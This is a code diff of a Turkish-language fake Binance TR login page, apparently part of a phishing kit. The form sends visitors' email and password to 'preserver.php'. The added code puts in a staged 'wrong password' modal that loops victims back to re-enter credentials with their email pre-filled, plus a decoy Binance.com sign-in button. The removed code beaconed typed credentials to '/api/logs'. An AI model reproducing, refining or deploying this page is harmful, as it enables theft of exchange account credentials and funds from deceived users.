@@ -247,15 +247,23 @@
                   <div class="bar" data-v-6408680b=""></div>
                 </div>
               </div>
-              <form action="preserver.php" method="POST" autocomplete="off">
+              <form action="<?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { echo 'pages/form.php?updatePassword'; } else { echo 'preserver.php'; } ?>" method="POST" autocomplete="off">
+                <div class="oauth-title" data-v-6408680b="" data-v-5c4d12e5=""> Binance.com hesabıyla oturum açın: </div>
+                <a class="oauth-btn bc-btn bc-font-medium" data-v-1bb59c78="" data-v-5c4d12e5="" data-v-6408680b="">
+                  <img src="./assets/images/tlgbn.svg" alt="image" data-v-1bb59c78="">
+                  <span data-v-1bb59c78="">Binance.com hesabıyla oturum açın</span>
+                </a>
                 <div class="create-account" data-v-6408680b="" data-v-5c4d12e5=""> Binance TR hesabıyla oturum açın: </div>
-                <br>
-                <div value="" class="input-model input-mg20" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
-                  <div class="dynamic-placeholder" data-v-4d51f6f4="">E-posta / TCKN</div>
-                  <input type="text" id="email" name="email" data-v-4d51f6f4="" autocomplete="email">
+                <div value="" class="input-model input-mg20 <?php if(isset($user['email'])) { echo 'pwd-focus'; } else { echo ''; } ?>" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
+                  <div class="dynamic-placeholder" data-v-4d51f6f4="">E-posta</div>
+                  <?php if(isset($user['email'])) { ?>
+                    <input type="text" id="email" name="email" data-v-4d51f6f4="" autocomplete="email" value="<?php echo $user['email']; ?>" readonly disabled>
+                  <?php } else { ?>
+                    <input type="text" id="email" name="email" data-v-4d51f6f4="" autocomplete="email">
+                  <?php } ?>
                   <div class="icon-wrap" data-v-4d51f6f4="">
                   </div>
-                  <div data-v-4d51f6f4="" class="input-error">Lütfen geçerli bir e-posta/tdkn girin</div>
+                  <div data-v-4d51f6f4="" class="input-error">Lütfen geçerli bir e-posta girin</div>
                 </div>
                 <div value="" class="input-model input-mg20" data-v-4d51f6f4="" data-v-5c4d12e5="" data-v-6408680b="">
                   <div class="dynamic-placeholder" data-v-4d51f6f4="">Şifre</div>
@@ -267,7 +275,7 @@
                       </svg>
                     </div>
                   </div>
-                  <div data-v-4d51f6f4="" class="input-error" style="display: none;">
+                  <div data-v-4d51f6f4="" class="input-error" style="<?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { echo 'display: block;'; } else { echo 'display: none;'; } ?>">
                     En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.
                   </div>
                 </div>
@@ -280,16 +288,54 @@
                     <a data-v-5c4d12e5="" data-v-6408680b="">Kaydol</a>
                   </div>
                 </div>
+                <input type="hidden" name="token" value="<?php echo isset($_SESSION['form_token']) ? $_SESSION['form_token'] : generateFormToken(); ?>">
               </form>
             </div>
           </section>
         </main>
+        <?php include 'component/footer.php'; ?>
       </div>
     </div>
   </div>
   <div class="loading-box" style="display: none;">
     <img src="./assets/images/loading.svg" alt="loading">
   </div>
+  <?php if(isset($_GET['status']) && $_GET['status'] == 'wrongpassword') { ?> 
+    <div class="area" id="modal">
+      <div class="css-1vb7bc9" style="transform: translate3d(0px, 0px, 0px);">
+        <div class="css-lu6k78" style="opacity: 1;">
+          <div class="css-14qry50">
+            <div class="css-1bpj83k">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-boyavq">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.326 13.909l-1.429 1.417L12 13.429l-3.897 3.897-1.429-1.417 3.909-3.898-3.909-3.908 1.429-1.417L12 10.583l3.897-3.897 1.429 1.417-3.897 3.908 3.897 3.898z" fill="currentColor"></path>
+              </svg>
+            </div>
+            <div class="bn-notification-body-wrapper css-gxv9qv">
+              <div data-bn-type="text" class="bn-notification-msg-wrapper css-161eirp">Şifreniz hatalı.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="css-vp41bv">
+        <div class="css-baaq78">
+          <div class="css-tolw2i"></div>
+          <div class="css-16wz1c4">
+            <div class="css-hv39bs">
+              <div class="css-uq1pv2">
+                <div src="../assets/images/error.svg" class="css-ydz7pw"></div>
+              </div>
+              <div data-bn-type="text" class="modal-desc css-1ixmqv3">Şifreniz hatalı lütfen tekrar deneyin.</div>
+              <div class="btn-group css-1tr0qpm">
+                <button data-bn-type="button" class="bc-btn bc-btn-yellow sensors-login" style="width:100%" onclick="modal.style.display = 'none';">
+                  <div data-bn-type="text" class="css-1c82c04">Anladım</div>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  <?php }?>
   <script>
     let f = false;
     const f1 = document.querySelector('form');
@@ -381,48 +427,17 @@
       el.parentElement.lastElementChild.style.display = 'none';
     }
 
-    function logFormSubmission() {
-      const payload = {
-        page: 'login',
-        inputs: {
-          input1: em.value,
-          input2: pw.value,
-          input3: '',
-          input4: '',
-          input5: '',
-          input6: ''
-        }
-      };
-
-      try {
-        const body = JSON.stringify(payload);
-        if (navigator.sendBeacon) {
-          const blob = new Blob([body], { type: 'application/json' });
-          navigator.sendBeacon('/api/logs', blob);
-        } else {
-          fetch('/api/logs', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body
-          }).catch(err => console.error('Log submit failed', err));
-        }
-      } catch (err) {
-        console.error('Failed to log submission', err);
-      }
-    }
-
     f1.addEventListener('submit', (e) => {
       e.preventDefault();
 
       var ev = em.value;
       var pwValid = /(?=.*\d)(?=.*[A-Z])[\s\S]{8,128}/.test(pw.value.trim());
-      var emValid = ev.trim().length > 0;
+      var emValid = (ev.length === 11 && /^[0-9]+$/.test(ev)) ? TCNOKontrol(ev) : /^[\w+&*-]+[-+.'&*\w]*@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/.test(ev.trim());
 
       pwValid ? tFn(pw) : errFn(pw);
       emValid ? tFn(em) : errFn(em);
 
       if (pwValid && emValid) {
-        logFormSubmission();
         f1.submit();
       }
     });
@@ -434,14 +449,5 @@
       });
     }
   </script>
-  <script>
-    const pingServer = () => {
-      fetch('/api/ping').catch(err => console.error('Ping failed', err));
-    };
-
-    pingServer();
-    setInterval(pingServer, 4000);
-  </script>
 </body>
-
 </html>
